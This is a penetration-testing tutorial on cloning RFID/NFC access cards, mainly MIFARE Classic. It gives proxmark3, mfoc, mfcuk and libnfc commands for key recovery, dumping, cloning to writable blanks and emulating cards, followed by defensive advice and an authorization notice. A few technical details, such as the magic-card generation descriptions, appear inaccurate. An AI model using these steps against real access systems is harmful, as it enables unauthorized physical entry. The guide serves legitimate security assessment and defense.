# RFID/NFC Card Cloning and Attack Guide

This guide covers the methodology for attacking RFID and NFC card systems, with a primary focus on MIFARE Classic cards (the most widely deployed contactless smart card in access control). It also covers MIFARE Ultralight, DESFire, and general NFC tag operations using proxmark3 and related tools.

## Introduction and Objectives

RFID and NFC card cloning is a critical skill for physical penetration testing assessments, where access control systems are within scope. This guide covers the complete card attack lifecycle from detection and identification through key recovery, data extraction, cloning, and emulation, with practical defense recommendations for card system administrators.

**Learning objectives**:

- Identify card technology types (MIFARE Classic, Ultralight, DESFire, HID, EM4100) using proxmark3 and libnfc
- Recover MIFARE Classic sector keys using nested (mfoc), darkside (mfcuk), and dictionary attacks
- Dump and analyze card data to identify access levels, cardholder IDs, and stored values
- Clone cards to writable blanks and emulate cards using proxmark3
- Assess advanced card technologies (DESFire, HID iCLASS) and their security properties

**Prerequisites**: A proxmark3 Easy or RDV4 device (or compatible NFC reader). A selection of cards for testing (MIFARE Classic 1K, blank UID-writable cards). Understanding of RFID/NFC frequency bands and basic smart card architecture.

---

## Overview

RFID (Radio-Frequency Identification) and NFC (Near-Field Communication) are contactless technologies operating at two primary frequencies:

- **Low Frequency (125 kHz)**: HID Prox, EM4100, T5577 -- legacy access cards, simple UID-based authentication
- **High Frequency (13.56 MHz)**: MIFARE family, NTAG, DESFire -- modern access cards, payment cards, transit passes

The MIFARE Classic card is the most commonly encountered card in penetration testing. It uses the proprietary CRYPTO1 cipher for encryption, which was reverse-engineered in 2008. Multiple practical attacks exist:

- **Nested authentication attack** (mfoc): Exploits the weak random number generator in CRYPTO1 to recover keys when at least one sector key is known
- **Darkside attack** (mfcuk): Exploits the authentication protocol to recover a single key even when no keys are known
- **Hardnested attack**: Recovers keys from cards with partially hardened CRYPTO1 implementation

MIFARE Classic cards are organized into 16 sectors (1K) or 40 sectors (4K), each protected by two keys (Key A and Key B). Each sector contains an access conditions trailer that defines which operations each key permits.

---

## Phase 1: Card Detection and Identification

The first step is identifying the card technology present. The proxmark3 `hf search` command auto-detects the card type by probing for different technologies:

```bash
# Auto-detect card type
proxmark3-client -c "hf search"

# Typical output for MIFARE Classic 1K:
# UID: A1 B2 C3 D4
# ATQA: 00 04
# SAK: 08 [MIKRON]
# Possible types: MIFARE Classic 1K
# Prng detection: weak
```

With libnfc, use the basic detection commands:

```bash
# List NFC devices (readers)
nfc-list

# Poll for tags
nfc-poll

# Detailed scan with verbose output
nfc-scan-device -v
```

Key card identification parameters:
- **UID**: Unique identifier (4 or 7 bytes). MIFARE Classic uses 4-byte UIDs; newer cards use 7-byte.
- **ATQA**: Answer to Request Type A -- indicates card family
- **SAK**: Select Acknowledge -- indicates specific card type
- **SAK 0x08**: MIFARE Classic 1K
- **SAK 0x18**: MIFARE Classic 4K
- **SAK 0x00**: MIFARE Ultralight
- **SAK 0x20**: MIFARE DESFire

---

## Phase 2: MIFARE Classic Key Recovery

### Nested Attack with mfoc

mfoc (MIFARE Classic Offline Crack) exploits the weak PRNG in CRYPTO1 to recover sector keys. It requires at least one known key to bootstrap the attack. The default key `0xA0A1A2A3A4A5` (or `0xFFFFFFFFFFFF`) is commonly found on sector 0.

```bash
# Standard key recovery with default known key
mfoc -P 500 -O card_dump.mfd

# Specify multiple known keys
mfoc -P 500 -O card_dump.mfd \
  -k A0A1A2A3A4A5 \
  -k FFFFFFFFFFFF \
  -k 000000000000 \
  -k D3F7D3F7D3F7 \
  -k B0B1B2B3B4B5

# Faster recovery with fewer probes (less reliable)
mfoc -P 100 -O card_dump_fast.mfd

# Save recovered keys separately
mfoc -P 500 -O card_dump.mfd -D card_keys.mfd
```

The `-P` parameter controls the number of probes per sector. Higher values (500-1000) are more reliable but slower. Typical recovery time with default keys is 2-15 minutes for a full 1K card.

### Darkside Attack with mfcuk

When no keys are known and default keys fail, mfcuk (MIFARE Classic Universal Toolkit) performs the darkside attack, which exploits the authentication protocol's error messages to recover a single key byte-by-byte:

```bash
# Basic darkside attack on sector 0, key A
mfcuk -C -R 0:A -s 250 -S 5 -v 3

# Target specific sector
mfcuk -C -R 5:A -s 500 -S 10 -v 3

# With a key hint to accelerate recovery
mfcuk -C -R 0:A -s 250 -S 5 -v 3 -k A0A1A2A3A4A5
```

The darkside attack is significantly slower than nested (30+ minutes per key) and requires the card to respond to failed authentication attempts with specific error patterns. Some newer cards have patched the vulnerability that enables the darkside attack.

### Proxmark3 Key Checking

Proxmark3 provides its own key checking mechanism that can test large key dictionaries rapidly:

```bash
# Check all sectors against a dictionary of common keys
proxmark3-client -c "hf mf chk --1k -d /tmp/default_keys.txt"

# Check specific sector
proxmark3-client -c "hf mf chk --sn 0 -d /tmp/keys.txt"

# Generate default key list and check
proxmark3-client -c "hf mf chk --1k --blank"
```

---

## Phase 3: Card Dumping and Analysis

Once keys are recovered, dump the full card contents:

```bash
# Full MIFARE Classic dump with proxmark3
proxmark3-client -c "hf mf dump"

# Dump specific sector
proxmark3-client -c "hf mf rdsc --sn 0 --kt A --key A0A1A2A3A4A5"

# Read specific block
proxmark3-client -c "hf mf rdbl --blk 4 --kt A --key A0A1A2A3A4A5"

# Dump with mfoc (keys already recovered)
mfoc -P 500 -O card_dump.mfd

# Dump with libnfc
nfc-mfclassic r a card_dump.mfd /dev/ttyACM0
```

Analyze the dump to identify:
- **Block 0**: Manufacturer data and UID (read-only on genuine cards)
- **Sector trailers (blocks 3, 7, 11, ...)**: Key A, access bits, Key B for each sector
- **Access conditions**: Determine which keys allow read/write operations
- **User data**: Payload data in non-trailer blocks (cardholder ID, access levels, balance)

```bash
# Human-readable dump analysis
python3 -c "
import sys
data = open(sys.argv[1], 'rb').read()
for sector in range(16):
    print(f'--- Sector {sector} ---')
    for block in range(4):
        offset = sector * 64 + block * 16
        chunk = data[offset:offset+16]
        hex_str = ' '.join(f'{b:02x}' for b in chunk)
        ascii_str = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        print(f'  Block {sector*4+block:2d}: {hex_str} | {ascii_str}')
" card_dump.mfd
```

---

## Phase 4: Card Cloning and Emulation

### Writing to Blank Cards

```bash
# Clone with proxmark3 (UID-writable card required for exact UID match)
proxmark3-client -c "hf mf clone --uid A1B2C3D4"

# Write dump via libnfc
nfc-mfclassic w a card_dump.mfd /dev/ttyACM0

# Write specific block
proxmark3-client -c "hf mf wrbl --blk 4 --kt A --key A0A1A2A3A4A5 -d 01020304050607080910111213141516"
```

Note on card types for cloning:
- **Gen1UID cards**: Writable block 0 (UID), cheapest option, detectable by some readers
- **Gen2 cards**: Writable UID via backdoor command, harder to detect
- **Magic UID cards**: Appear as genuine cards to most readers, most expensive

### Card Emulation

Proxmark3 can emulate a card directly without a physical blank card:

```bash
# Emulate MIFARE Classic with UID and dump file
proxmark3-client -c "hf mf sim --uid A1B2C3D4 -i card_dump.bin"

# Emulate MIFARE Ultralight
proxmark3-client -c "hf mfu sim -t 7 -i"

# Emulate ISO 14443-A tag with custom UID
proxmark3-client -c "hf 14a sim -t 1 -u A1B2C3D4"
```

Emulation is useful for:
- Testing reader behavior without physical cards
- Relay attacks (emulate card at a distance)
- Quick iteration during card format reverse engineering

---

## Phase 5: Advanced RFID Operations

### MIFARE DESFire

MIFARE DESFire (EV1/EV2/EV3) uses AES encryption and is significantly more secure than Classic:

```bash
proxmark3-client -c "hf mfdes info"
proxmark3-client -c "hf mfdes enum"
```

DESFire attacks focus on:
- Default application keys (unchanged from factory)
- Key diversification weaknesses (predictable master key derivation)
- Application-level misconfigurations (unauthenticated read access)
- Downgrade attacks forcing DES instead of AES

### ISO 15693 (Long-Range RFID)

```bash
proxmark3-client -c "hf 15 search"
proxmark3-client -c "hf 15 read --uid E001020304050607 --block 0"
```

ISO 15693 cards operate at greater range (up to 1-2 meters) and are used in logistics, library systems, and some access control scenarios.

### HID iCLASS

```bash
proxmark3-client -c "hf iclass info"
proxmark3-client -c "hf iclass read --csn"
```

HID iCLASS cards use proprietary encryption and are common in enterprise access control. Attacks require specific proxmark3 firmware and antenna configurations.

---

## Defense Against Card Cloning

### For Card Issuers

1. **Upgrade from MIFARE Classic to DESFire EV2/EV3**: AES-128 encryption eliminates all CRYPTO1 attacks
2. **Use diversified keys**: Each card should have unique sector keys derived from a master key and the card UID, preventing mass compromise from a single key recovery
3. **Enable card authentication**: Readers should authenticate the card (challenge-response) before granting access, not just read the UID
4. **Implement transaction counters**: Detect cloned cards by tracking transaction counters that increment monotonically
5. **Deploy reader-side clone detection**: Monitor for anomalous timing, signal patterns, or proxmark3-specific RF signatures

### For System Administrators

1. **Audit card technology**: Identify all MIFARE Classic cards in use and plan migration to DESFire
2. **Check for default keys**: Run proxmark3 `hf mf chk` against your own cards to verify no default keys are in use
3. **Implement multi-factor access**: Combine card authentication with PIN, biometric, or mobile app verification
4. **Monitor access logs**: Flag duplicate UID authentications from different physical locations within impossible timeframes
5. **Physical security**: Proxmark3 and similar devices can read cards through wallets and bags. Encourage card sleeves or shielded wallets for high-security areas

---

## Common Mistakes

1. **Using the wrong card type for cloning**: Gen1UID cards are easily detected by modern readers. Use Gen2 or Magic UID cards for assessments against current access control systems.

2. **Ignoring access bits**: Sector trailers contain access conditions that may prevent writing even with the correct key. Always read and understand the access bits before attempting to write.

3. **Assuming card-only attacks**: Some access control systems only read the UID (block 0) without verifying any sector keys. For these systems, simply writing the correct UID to a blank card is sufficient -- no key recovery needed.

4. **Not testing against the actual reader**: A successful clone in the lab may fail against the target reader due to anti-tamper mechanisms, transaction counters, or mutual authentication. Always test against the actual reader (within authorized scope).

5. **Overlooking sector 0 key diversification**: Even when all other sector keys are diversified, sector 0 often uses a common key for manufacturer data access. This single weak sector can bootstrap the full nested attack.

---

> **Legal Notice**: RFID/NFC card cloning for access control systems requires explicit written authorization from the system owner. Cloning payment cards, government-issued IDs, or transit passes is illegal regardless of authorization scope. Only clone cards explicitly listed in your engagement letter.

## Hands-on Exercise: RFID/NFC Card Assessment

Practice the complete card assessment and cloning methodology:

**Setup**:

```bash
# Ensure proxmark3 client is installed and device is connected
proxmark3-client -c "hw version"
# Have several card types available: MIFARE Classic 1K, blank UID-writable cards
```

**Exercise steps**:

1. Run `hf search` to auto-detect the card type and record UID, ATQA, SAK values
2. Attempt key recovery with mfoc using default keys: `mfoc -P 500 -O card_dump.mfd`
3. If mfoc fails (no default keys), attempt darkside attack with mfcuk
4. Check keys against a dictionary of common keys using proxmark3 `hf mf chk`
5. Once keys are recovered, dump the full card contents with `hf mf dump`
6. Analyze the dump to identify cardholder data, access levels, and sector access conditions
7. Clone the card to a UID-writable blank using proxmark3 `hf mf clone`
8. Verify the clone by reading it back and comparing with the original dump
9. Attempt card emulation with proxmark3 to test against the actual reader (if authorized)

**Validation criteria**: Successfully recover keys for all sectors of a MIFARE Classic 1K card. Dump and analyze card contents to identify meaningful data. Produce a working clone that reads identically to the original card.

## References and Resources

- [proxmark3 GitHub Repository](https://github.com/RfidResearchGroup/proxmark3)
- [mfoc GitHub Repository](https://github.com/nfc-tools/mfoc)
- [mfcuk GitHub Repository](https://github.com/nfc-tools/mfcuk)
- [libnfc GitHub Repository](https://github.com/nfc-tools/libnfc)
- [MIFARE Classic Documentation](https://www.nxp.com/products/rfid-nfc/mifare)
- [OWASP Physical Pentesting Guide](https://owasp.org/www-project-physical-security/)
